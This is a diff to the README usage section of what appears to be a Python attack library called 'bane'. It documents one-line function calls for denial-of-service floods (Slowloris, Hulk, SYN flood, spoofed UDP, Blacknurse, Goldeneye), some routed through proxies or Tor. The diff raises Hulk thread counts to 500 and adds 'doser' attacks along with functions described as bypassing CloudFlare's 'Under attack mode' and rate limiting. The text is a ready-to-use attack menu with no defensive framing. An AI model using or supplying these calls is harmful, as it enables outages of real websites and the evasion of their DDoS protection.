@@ -142,9 +142,9 @@ II-Usage:
 <h4>Slowloris attack through proxies:</h4>
 <br>bane.prox_slowloris(IP, p= port , duration= 300 , threads=500 , timeout=5 )
 <h4>Hulk attack:</h4>
-<br>bane.hulk(IP , duration= 300 , set_tor=False , threads=50 , timeout=5 )
+<br>bane.hulk(IP , duration= 300 , set_tor=False , threads=500 , timeout=5 )
 <h4>Hulk attack through proxies:</h4>
-<br>bane.prox_hulk(IP , duration= 300 , set_tor=False , threads=50 , timeout=5 )
+<br>bane.prox_hulk(IP , duration= 300 , set_tor=False , threads=500 , timeout=5 )
 <h4>TCP flags attack:</h4>
 <br>bane.synflood(IP , p=port , duration= 300 , syn=1 , rst=0 , psh=0 , ack=0 , urg=0 , fin=0 , interval=0.1 , threads=50 )
 <h4>Spoofed source UDP flood:</h4>
@@ -173,3 +173,11 @@ II-Usage:
 <br>bane.blacknurse(IP, p= port , duration= 300 , interval=0.001 , threads=500 )
 <h4>Goldeneye attack:</h4>
 <br>bane.goldeneye(IP, p= port , duration= 300 , threads=500 , timeout=5 )
+<h4>Doser attack:</h4>
+<br>bane.doser(link , duration= 300 , set_tor=False , threads=500 , timeout=5 )
+<h4>Doser attack through proxies:</h4>
+<br>bane.doser(link , duration= 300 , threads=500 , timeout=5 )
+<h4>Bypass "Under attack mode" provided by CloudFlare:</h4>
+<br>bane.cf_kill_ua(link , duration= 300 , threads=500 , timeout=5 )
+<h4>Bypass "Under attack mode" provided by CloudFlare and Rate-Limiting:</h4>
+<br>bane.cf_kill_ua_rate_limiting(link , duration= 300 , set_tor=False , threads=500 , timeout=5 )
